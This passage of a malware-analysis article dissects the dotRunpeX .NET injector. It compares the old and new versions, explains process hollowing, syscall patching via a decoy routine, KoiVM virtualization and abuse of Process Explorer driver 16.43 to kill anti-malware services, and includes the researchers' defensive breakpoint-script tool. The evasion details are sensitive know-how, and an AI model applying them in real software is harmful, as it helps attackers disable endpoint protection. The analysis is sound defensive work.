class=\"wp-block-heading\">The new version of dotRunpeX:</h3>\n\n\n\n<ul>\n<li>Protected by a customized version of the&nbsp;<a href=\"https://github.com/yck1509/KoiVM\">KoiVM virtualizer</a></li>\n\n\n\n<li>Highly configurable (disabling Anti-Malware services, Anti-VM, Anti-Sandbox, persistence settings, key for payload decryption, UAC bypass methods)</li>\n\n\n\n<li>More UAC Bypass techniques</li>\n\n\n\n<li>Using simple XOR to decrypt the main payload to be injected (omitted in the latest developed versions)</li>\n\n\n\n<li>Abusing procexp driver (<em><strong>Sysinternals</strong></em>) to kill protected processes (Anti-Malware services)</li>\n\n\n\n<li>Signs of being Russian based &#8211; procexp driver name&nbsp;<code>\u0418\u0438\u0441\u0443\u0441.sys</code>&nbsp;translated as \u201c<em><strong>jesus.sys</strong></em>\u201d</li>\n</ul>\n\n\n\n<h3 class=\"wp-block-heading\">Similarities between both versions:</h3>\n\n\n\n<ul>\n<li>64-bit executable files \u201c.exe\u201d written in .NET</li>\n\n\n\n<li>Used to inject several different malware families</li>\n\n\n\n<li>Using simple XOR to decrypt the main payload to be injected</li>\n\n\n\n<li>Possible usage of the same UAC bypass technique (the new version of dotRunpeX has more techniques available)</li>\n</ul>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27756\" height=\"394\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/X3VVKH4FB9-rId95-1-1024x394.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 16: UAC bypass technique</figcaption></figure></div>\n\n\n<ul>\n<li>Using the same version information</li>\n</ul>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27670\" height=\"523\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId98.png\" width=\"498\" /><figcaption class=\"wp-element-caption\">Figure 17: DotRunpeX version information</figcaption></figure></div>\n\n\n<ul>\n<li>Using the same .NET resource name&nbsp;<code>BIDEN_HARRIS_PERFECT_ASSHOLE</code>&nbsp;to hold the encrypted payload to be injected</li>\n</ul>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27671\" height=\"313\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId101-1024x313.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 18: Dotnet resource name of new version vs.&nbsp;old version</figcaption></figure></div>\n\n\n<ul>\n<li>Using the same code injection technique &#8211; Process Hollowing</li>\n\n\n\n<li>Using the same structured class for definitions of Native delegates</li>\n</ul>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27672\" height=\"395\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId104-1024x395.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 19: The same structured class for definitions of Native delegates</figcaption></figure></div>\n\n\n<h1 class=\"wp-block-heading\">Full technical analysis &#8211; old version of dotRunpeX</h1>\n\n\n\n<p>For the analysis of the older version of dotRunpeX, sample SHA256: \u201c65cac67ed2a084beff373d6aba6f914b8cba0caceda254a857def1df12f5154b\u201d was used. This sample is a 64-bit executable file \u201c.exe\u201d written in .NET, implementing custom obfuscation &#8211; only obfuscations of names. The version information is consistent across all samples we analyzed, and we can notice the ProductName &#8211;&nbsp;<code>RunpeX.Stub.Framework</code>&nbsp;that could be some kind of first hint that we are dealing with a dotnet injector.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27673\" height=\"349\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId110-1024x349.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 20: Consistent version information of the old dotRunpeX version</figcaption></figure></div>\n\n\n<p>For simplicity, we partly deobfuscated the names of methods, their arguments, and local variables. Right in the&nbsp;<code>Main()</code>&nbsp;method, we can see simple XOR decryption of the resource&nbsp;<code>BIDEN_HARRIS_PERFECT_ASSHOLE</code>&nbsp;that contains an encrypted payload to be injected. The resource name was consistent across all samples we analyzed.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27674\" height=\"191\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId113-1024x191.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 21: The main method leads to simple XOR decryption of the embedded payload</figcaption></figure></div>\n\n\n<p>We can also see the namespace&nbsp;<code>UACBypass</code>&nbsp;with the class name&nbsp;<code>UAC</code>. This class implements UAC (<em><strong>User Account Control</strong></em>) bypass method, but it is not configured to use in this sample.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27755\" height=\"394\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/X3VVKH4FB9-rId95-1024x394.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 22: UAC bypass method</figcaption></figure></div>\n\n\n<p>Method&nbsp;<code>Inject()</code>&nbsp;is implementing a code injection technique called \u201c<em><strong>Process Hollowing</strong></em>\u201d. We can notice spawning a process in a suspended state right in the picture below.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27676\" height=\"379\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId118-1024x379.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 23: Creation of suspended process as a part of the Process Hollowing technique</figcaption></figure></div>\n\n\n<p>This technique is nothing new in the world of malware development. Still, there is something interesting we can immediately spot once we check&nbsp;<a href=\"https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke\">P/Invoke</a>&nbsp;(technology that allows access to structs, callbacks, and functions in unmanaged libraries from managed code) defined methods of this sample. These methods can be seen in the&nbsp;<code>ImplMap</code>&nbsp;table, which is a part of .NET metadata.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27677\" height=\"366\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId122-1024x366.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 24: The ImplMap table &#8211; the old version of the dotRunpeX</figcaption></figure></div>\n\n\n<p>Certain WIN APIs or NT APIs must be used to perform the&nbsp;<strong>Process Hollowing</strong>&nbsp;technique. And as we saw in the&nbsp;<code>ImplMap</code>&nbsp;table, some of the most crucial APIs are missing. To be more specific, we cannot see any APIs related to unmapping and writing to remote process memory. The reason behind this is the usage of the&nbsp;<a href=\"https://github.com/TheWover/DInvoke\">D/Invoke</a>&nbsp;framework to call certain NT API routines that could usually trigger attention.</p>\n\n\n\n<p>D/Invoke contains powerful primitives that may be combined intelligently to dynamically invoke unmanaged code from disk or memory with careful precision. It relies on the usage of the dotnet method&nbsp;<code>GetDelegateForFunctionPointer()</code>&nbsp;and corresponding delegates definitions.</p>\n\n\n\n<p>In this case, NT APIs <code>ZwOpenSection</code>, <code>ZwMapViewOfSection</code>, <code>ZwUnmapViewOfSection</code>, <code>NtClose</code>, <code>NtWriteVirtualMemory</code>, <code>NtResumeThread</code>, and <code>RtlMoveMemory </code>are implemented via D/Invoke. The corresponding definitions of delegates can be seen below.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27680\" height=\"446\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId125-1-1024x446.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 25: The class for definitions of Native delegates</figcaption></figure></div>\n\n\n<p>What is even more interesting, 4 NT APIs (<code>ZwUnmapViewOfSection</code>,&nbsp;<code>NtWriteVirtualMemory</code>,&nbsp;<code>NtResumeThread</code>,&nbsp;<code>RtlMoveMemory</code>) implemented via D/Invoke are using something that could be considered as an added PoC technique and is not a part of the original D/Invoke framework &#8211;&nbsp;<strong>syscall patching</strong>. For example, we can check how&nbsp;<code>NtWriteVirtualMemory</code>&nbsp;invocations are implemented via a method called&nbsp;<code>CallNtWriteVirtualMemory()</code>.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27681\" height=\"378\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId128-1-1024x378.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 26: Example of D/Invoke implementation that leads to syscall patching</figcaption></figure></div>\n\n\n<p>First, what we can see is an altered usage of the D/Invoke framework in the method&nbsp;<code>MapDllandGetProcAddress()</code>. Each time this method is invoked, it will remap the specified library and obtain the desired function\u2019s address. Before returning the address of the desired function, pointer arithmetic is used to move the pointer by 4 bytes so it points to the address of the syscall number. In this case, the \u201c<em><strong>ntdll.dll</strong></em>\u201d module gets remapped, returning the address of the NT API routine&nbsp;<code>NtWriteVirtualMemory</code>&nbsp;altered by 4 bytes offset.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27682\" height=\"255\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId131-1024x255.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 27: Altered usage of the D/Invoke that returns the address pointing to the syscall number</figcaption></figure></div>\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27684\" height=\"147\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId134-1.png\" width=\"672\" /><figcaption class=\"wp-element-caption\">Figure 28: NtWriteVirtualMemory address altered by 4 bytes offset points to its syscall number</figcaption></figure></div>\n\n\n<p>The remapping of the module is used as an AV-evasion and Anti-Debug technique, as it results in unhooking and removing all set software breakpoints. The obtaining address of a certain native function is implemented via typical D/Invoke implementation &#8211;&nbsp;<code>DynGetProcAddress()</code>, which is responsible for in-memory parsing of the PE structure to find the address of the specified routine.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27685\" height=\"764\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId137.png\" width=\"903\" /><figcaption class=\"wp-element-caption\">Figure 29: Typical in-memory parsing of the PE structure implemented via D/Invoke</figcaption></figure></div>\n\n\n<p>Now back to the exciting part. As we can see in this case,&nbsp;<code>DynGetProcAddress()</code>&nbsp;is also used to find the address of NT API&nbsp;<code>NtAddBootEntry</code>, and we can call it a decoy routine. The decoy routine address will be used for syscall patching.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27686\" height=\"557\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId140-1024x557.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 30: Decoy routine NtAddBootEntry used for syscall patching</figcaption></figure></div>\n\n\n<ul>\n<li>Getting the address of the&nbsp;<code>NtWriteVirtualMemory</code>&nbsp;routine altered by 4 bytes offset (address of syscall number)</li>\n\n\n\n<li>Getting the address of the decoy routine&nbsp;<code>NtAddBootEntry</code></li>\n\n\n\n<li>Copying 2 bytes from the altered address of&nbsp;<code>NtWriteVirtualMemory</code>&nbsp;(even though the syscall number is&nbsp;<em><strong>DWORD</strong></em>, these 2 bytes are enough and represent the syscall number of&nbsp;<code>NtWriteVirtualMemory</code>) to byte field&nbsp;<code>SyscallStub</code>&nbsp;(this field contains syscall stub code)</li>\n\n\n\n<li>Patching address of&nbsp;<code>NtAddBootEntry</code>&nbsp;with byte field&nbsp;<code>SyscallStub</code></li>\n</ul>\n\n\n\n<p>Disassembling the default value of the&nbsp;<code>SyscallStub</code>&nbsp;makes it even more apparent why exactly 2 bytes are getting replaced with bytes from the altered address of the&nbsp;<code>NtWriteVirtualMemory</code>&nbsp;routine. These 2 bytes represent the syscall number of certain real function to be called.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27687\" height=\"145\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId143-1024x145.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 31: Disassembling the default value of the byte field SyscallStub</figcaption></figure></div>\n\n\n<p>Simply said, once the&nbsp;<code>NtWriteVirtualMemory</code>&nbsp;function is called, the only thing we will see from user mode will be an invocation of&nbsp;<code>NtAddBootEntry</code>.</p>\n\n\n\n<p>We can use&nbsp;<strong>WinDbg</strong>&nbsp;\u201c<em><strong>kernel mode debugging</strong></em>\u201d to verify the mentioned execution flow. We can see that NT API&nbsp;<code>NtAddBootEntry</code>&nbsp;with the original syscall number 0x6a (on our target system) is used as a patched decoy routine. In the case where&nbsp;<code>NtWriteVirtualMemory</code>&nbsp;needs to be called, the syscall number of the decoy routine is patched with syscall number 0x3a (<code>NtWriteVirtualMemory</code>&nbsp;syscall number on our target system) and gets called.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27688\" height=\"463\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId146-1024x463.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 32: WinDbg \u201ckernel mode debugging\u201d shows the execution flow caused by syscall patching</figcaption></figure></div>\n\n\n<h1 class=\"wp-block-heading\">Full technical analysis &#8211; new version of dotRunpeX</h1>\n\n\n\n<p>For the analysis of the new version of dotRunpeX, sample SHA256: \u201c44a11146173db0663a23787bffbb120f3955bc33e60e73ecc798953e9b34b2f2\u201d was used. This sample is a 64-bit executable file \u201c.exe\u201d written in .NET, protected by&nbsp;<a href=\"https://github.com/yck1509/KoiVM\">KoiVM</a>. The version information is the same as in the case of an older version of dotRunpeX and is consistent across all samples we analyzed. We can notice the ProductName &#8211;&nbsp;<code>RunpeX.Stub.Framework</code>&nbsp;again.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27689\" height=\"371\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId150-1024x371.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 33: Consistent version information of the new dotRunpeX version</figcaption></figure></div>\n\n\n<p>Right after opening the sample in&nbsp;<a href=\"https://github.com/dnSpyEx/dnSpy\">dnSpyEx</a>&nbsp;and leading to the entrypoint function &#8211;&nbsp;<code>_sb()</code>&nbsp;method, we can immediately confirm that this new version of dotRunpeX is protected by the KoiVM virtualizer. Despite the fact that most of the IL code is virtualized, we can still spot invocation of P/Invoke defined method&nbsp;<code>CreateProcess</code>&nbsp;that is used in a way to create a process in a suspended state &#8211; typically used for code injection technique \u201c<em><strong>Process Hollowing</strong></em>\u201d.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27691\" height=\"390\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId154-1024x390.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 34: Creation of suspended process as a part of the Process Hollowing technique</figcaption></figure></div>\n\n\n<p>After investigating more what was left lying around in .NET metadata, specifically in the&nbsp;<code>ImplMap</code>&nbsp;table, to find out what other methods are defined as P/Invoke and very likely used by this sample, we are getting surprisingly even more exciting findings than in the case of the older version of dotRunpeX. Apparently, the sample will perform not just code injection but also loading and communicating with the driver.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27692\" height=\"735\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId157.png\" width=\"924\" /><figcaption class=\"wp-element-caption\">Figure 35: The ImplMap table &#8211; the new version of the dotRunpeX</figcaption></figure></div>\n\n\n<p>The next that we immediately noticed is the usage of the same resource name as in the case of the older version &#8211;&nbsp;<code>BIDEN_HARRIS_PERFECT_ASSHOLE</code>&nbsp;&#8211; that contains an encrypted payload to be injected. The resource name was consistent across all samples we analyzed. Obviously, the decryption routine is hidden behind the code virtualization, but an educative guess will lead us to a simple XOR decryption routine using a password expressing the secret desires of the author &#8211;&nbsp;<code>I_LOVE_HENTAIU2</code>.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27693\" height=\"351\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId160-1024x351.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 36: Simple XOR decryption of the .NET resource using password \u201cI_LOVE_HENTAIU2\u201d</figcaption></figure></div>\n\n\n<p>Unfortunately, as dotRunpeX is still in high development and adding new features, the latest samples utilizing this injector changed the decryption scheme (no more simple XOR) to omit static extraction of embedded payloads.</p>\n\n\n\n<p>As we pointed out before, the IL code is protected by the KoiVM virtualizer, so to continue with our analysis, we needed to come up with some approach to deal with the protected code and get something meaningful from that in a reasonable time. First, what came to our mind was to use a publicly available open-source KoiVM de-virtualizer called&nbsp;<a href=\"https://github.com/Washi1337/OldRod\">OldRod</a>. This tool is fully workable for the vanilla version of KoiVM. It is even developed in a way that defeats some simple modifications of the original version of KoiVM (such as signature modifications of the methods in&nbsp;<code>VMEntry</code>&nbsp;class or changes in the default&nbsp;<code>#Koi</code>&nbsp;stream name).</p>\n\n\n\n<p>Unfortunately for us, we are dealing with a customized version of KoiVM that modified the protector in a way that is not so simple to defeat. The original implementation of KoiVM defines 119 constant variables that are used to virtualize the code. These constants are used to define registers, flags, opcodes, etc. Assigned values of these constants are used for the proper execution of the virtualized code and are also needed for the de-virtualization process.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27694\" height=\"558\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId164-1024x558.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 37: The original implementation of KoiVM defines 119 constants</figcaption></figure></div>\n\n\n<p>When using the vanilla version of KoiVM, the resulting constants appear in the compiled, protected sample inside the&nbsp;<code>Constants</code>&nbsp;class as fields in the exact same order with ascending values of tokens. The order of constants and their corresponding tokens inside the compiled binary is something OldRod depends on.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27695\" height=\"408\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId167-1024x408.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 38: The OldRod source code &#8211; automatic detection of constants</figcaption></figure></div>\n\n\n<p>Although the OldRod tool is an absolute masterpiece and can deal with a custom order of constants when providing a custom constants mapping via configuration file (<code>--config</code>&nbsp;option), finding out the correct mapping of those constants could not be as simple as it sounds. Sometimes when a constant\u2019s order is handmade change, it could be not so hard to map them correctly by analyzing their usage in code. Unfortunately, in the case of dotRunpeX, we can immediately see that values of those constants are affected by runtime arithmetic assignments (no problem to defeat this programmatically), but even worse is that they are scrambled in a very effective way that makes the correct mapping hard enough to consider this approach as not usable for getting some results in a reasonable time.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27696\" height=\"464\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId170-1024x464.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 39: Runtime arithmetic assignments of scrambled constants</figcaption></figure></div>\n\n\n<p>Even though we pointed out several facts about the extreme hardness of devirtualization, with precise code analysis and some hard moments during the constants mapping via their appropriate handlers, we were able to fully devirtualize the code. Despite the fully devirtualized code, we were still left with a non-fully runnable .NET Assembly that was still obfuscated with ConfuserEx obfuscator. To continue our madness, we were able to get rid of this obfuscation too.</p>\n\n\n\n<p>To give a little spoiler about the functionality of the dotRunpeX injector and its use of procexp driver, fully devirtualized and deobfuscated code related to driver routines can be seen below.</p>\n\n\n\n<p>Driver loading/unloading:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27697\" height=\"312\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId173-1024x312.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 40: Devirtualized and deobfuscated code responsible for loading/unloading the driver</figcaption></figure></div>\n\n\n<p>Communication with procexp device:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27698\" height=\"446\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId176-1024x446.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 41: Devirtualized and deobfuscated code responsible for communication with procexp device</figcaption></figure></div>\n\n\n<p>The process of devirtualization and deobfuscation is a subject to consider for its own blog post and won\u2019t be covered further.</p>\n\n\n\n<p>Normally, when it is impossible to devirtualize the code in a reasonable time, we are still left with few other options. The first of the options, quite a common approach when dealing with virtualized code, is to go with dynamic analysis using a debugger, DBI (<em><strong>Dynamic Binary Instrumentation</strong></em>), hooking, and WIN API tracing. As we are dealing with dotnet code, another approach to come out with could be some PoC using some knowledge from the .NET internals world. As researchers who love to bring something new to the community, we decided to combine both of these approaches, which resulted in developing new tools that were approved to be very effective.</p>\n\n\n\n<p>To get more information about the code functionality, we started with the dynamic analysis approach using&nbsp;<a href=\"https://x64dbg.com/\">x64dbg</a>. As we pointed out before, the&nbsp;<code>ImplMap</code>&nbsp;table containing P/Invoke-defined methods seems to be a good starting point for setting breakpoints in the debugger. Automating the process of parsing out the P/Invoke defined methods and converting it to x64dbg script leads us to the first tool we developed, called \u201c<em><strong>ImplMap2x64dbg</strong></em>\u201d.</p>\n\n\n\n<h3 class=\"wp-block-heading\">ImplMap2x64dbg</h3>\n\n\n\n<p>Python script that uses&nbsp;<a href=\"https://github.com/malwarefrank/dnfile\">dnfile</a>&nbsp;module to properly parse .NET executable files and their metadata. This tool creates an x64dbg script for setting breakpoints on defined&nbsp;<code>ImplMap</code>&nbsp;(P/Invoke) methods of the .NET executable. This script can be downloaded in the last section of the article.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">import dnfile, sys, os\n\ndef Main():\n    if(len(sys.argv) != 2 or sys.argv[1] == '-h' or sys.argv[1] == '--help'):\n        print(\"Description: Creates x64dbg script for setting breakpoints on defined ImplMap (PInvoke) methods of .NET executable\")\n        print(f\"Usage: {os.path.basename(sys.argv[0])} &lt;filepath>\\n\")\n        sys.exit()\n\n    file_path = sys.argv[1]\n    script_path = file_path + \"_x64dbg.txt\"\n    dn_file = dnfile.dnPE(file_path)\n\n    if(dn_file.net is None or dn_file.net.metadata is None):\n        print(f\"{sys.argv[1]} is NOT a .NET executable !!!\\n\")\n        sys.exit()\n    if(dn_file.net.mdtables.ImplMap is None):\n        print(f\".NET executable '{sys.argv[1]}' has NO ImplMap !!!\\n\")\n        sys.exit()\n\n    # Getting all ImplMap methods and module scope\n    implmap_table = dn_file.net.mdtables.ImplMap.rows\n    implmap_modules = []\n    implmap_methods = []\n    [implmap_modules.append(row.ImportScope.row.Name.lower().replace(\".dll\", \"\")) for row in implmap_table if (row.ImportScope.row.Name.lower().replace(\".dll\", \"\") not in implmap_modules)]\n    [implmap_methods.append(row.ImportName) for row in implmap_table if (row.ImportName not in implmap_methods)]\n\n    # Creation of x64dbg script\n    x64dbg_script = \"; Replace charset depending APIs - ex. CreateProcess -> CreateProcessA or CreateProcessW !!!\\n\"\n    for module in implmap_modules:\n        x64dbg_script += f\"loadlib {module}\\n\"\n    for method in implmap_methods:\n        x64dbg_script += f\"SetBPX {method}\\n\"\n    with open(script_path, \"wt\",encoding=\"utf-8\") as f_scr:f_scr.write(x64dbg_script)\n    print(f\"x64dbg script created: '{script_path}'\")\n\nif __name__ == '__main__':\n    Main()</pre>\n\n\n\n<p>Processing our dotRunpeX sample with \u201c<em><strong>ImplMap2x64dbg</strong></em>\u201d will result in the x64dbg script:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">; Replace charset depending APIs - ex. CreateProcess -> CreateProcessA or CreateProcessW !!!\nloadlib kernel32\nloadlib ntdll\nloadlib user32\nloadlib advapi32\nSetBPX VirtualAllocEx\nSetBPX CreateProcessA\nSetBPX CreateProcessW\nSetBPX CreateRemoteThread\nSetBPX Wow64SetThreadContext\nSetBPX Wow64GetThreadContext\nSetBPX NtResumeThread\nSetBPX ZwUnmapViewOfSection\nSetBPX NtWriteVirtualMemory\nSetBPX MessageBoxA\nSetBPX MessageBoxW\nSetBPX GetModuleHandleA\nSetBPX GetModuleHandleW\nSetBPX FindWindowA\nSetBPX FindWindowW\nSetBPX GetProcAddress\nSetBPX GetFileAttributesA\nSetBPX GetFileAttributesW\nSetBPX ShowWindow\nSetBPX SetForegroundWindow\nSetBPX Wow64DisableWow64FsRedirection\nSetBPX Wow64RevertWow64FsRedirection\nSetBPX CreateFileA\nSetBPX CreateFileW\nSetBPX RtlInitUnicodeString\nSetBPX NtLoadDriver\nSetBPX NtUnloadDriver\nSetBPX OpenProcessToken\nSetBPX LookupPrivilegeValueA\nSetBPX LookupPrivilegeValueW\nSetBPX AdjustTokenPrivileges\nSetBPX CloseHandle\nSetBPX NtQuerySystemInformation\nSetBPX DeviceIoControl\nSetBPX GetProcessHeap\nSetBPX HeapFree\nSetBPX HeapAlloc\nSetBPX RtlCopyMemory</pre>\n\n\n\n<p>We focused mainly on certain WIN/NT APIs such as <code>CreateProcessW</code>, <code>NtWriteVirtualMemory</code>,<code>CreateFileA</code>, <code>CreateFileW</code>, <code>NtLoadDriver</code>, <code>NtQuerySystemInformation</code>, and <code>DeviceIoControl </code>as they are the interesting ones related to driver and process injection routines.</p>\n\n\n\n<p>The first interesting WIN API call we can see is&nbsp;<code>CreateFileW</code>&nbsp;which is used to create a file in path&nbsp;<code>C:\\Users\\XXX\\AppData\\Local\\Temp\\\u0418\u0438\u0441\u0443\u0441.sys</code>.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27699\" height=\"261\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId181.png\" width=\"851\" /><figcaption class=\"wp-element-caption\">Figure 42: CreateFileW used to create a file \u201c\u0418\u0438\u0441\u0443\u0441.sys\u201d</figcaption></figure></div>\n\n\n<p>If we check the created file&nbsp;<code>\u0418\u0438\u0441\u0443\u0441.sys</code>&nbsp;(from the Russian language translated as \u201c<em><strong>jesus.sys</strong></em>\u201d), we will immediately find out it is a valid Process Explorer driver, version 16.43.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27700\" height=\"718\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId184-1024x718.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 43: Created file \u201c\u0418\u0438\u0441\u0443\u0441.sys\u201d is a valid Process Explorer driver, version 16.43</figcaption></figure></div>\n\n\n<p>We can see routine&nbsp;<code>NtLoadDriver</code>&nbsp;responsible for loading this driver where the argument points to&nbsp;<code>DriverServiceName</code>&nbsp;&#8211;&nbsp;<code>\\Registry\\Machine\\System\\CurrentControlSet\\Services\\TaskKill</code>&nbsp;that specifies a path to the driver\u2019s registry key.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27705\" height=\"355\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId187-1.png\" width=\"882\" /><figcaption class=\"wp-element-caption\">Figure 44: NtLoadDriver used to load procexp driver via its associated registry key</figcaption></figure></div>\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27704\" height=\"186\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId190-1.png\" width=\"980\" /><figcaption class=\"wp-element-caption\">Figure 45: Content of the driver\u2019s registry key \u201c\\Registry\\Machine\\System\\CurrentControlSet\\Services\\TaskKill\u201d</figcaption></figure></div>\n\n\n<p>Connecting to the process explorer device follows.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27703\" height=\"212\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId193-1024x212.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 46: Obtaining the handle of the process explorer device</figcaption></figure></div>\n\n\n<p>One of the dotRunpeX AV-evasion techniques is killing a hardcoded list of Anti-Malware services with the help of a process explorer driver (<em><strong>procexp.sys</strong></em>). The reason behind the usage of process explorer driver is that the Anti-Malware service usually runs as a protected process, more specifically as&nbsp;<a href=\"https://learn.microsoft.com/en-us/windows/win32/services/protecting-anti-malware-services-\">PPL</a>, to avoid disabling protection on the system caused by malicious activity. It is possible to abuse vulnerable versions of the procexp driver to close object handles of the protected process. Once enough handles are closed, the specific protected process will be killed. All samples we analyzed were abusing version 16.43 of this driver which is also the latest version vulnerable to this technique.</p>\n\n\n\n<p>To obtain information about object handles, dotRunpeX uses NT API&nbsp;<code>NtQuerySystemInformation&nbsp;</code>with 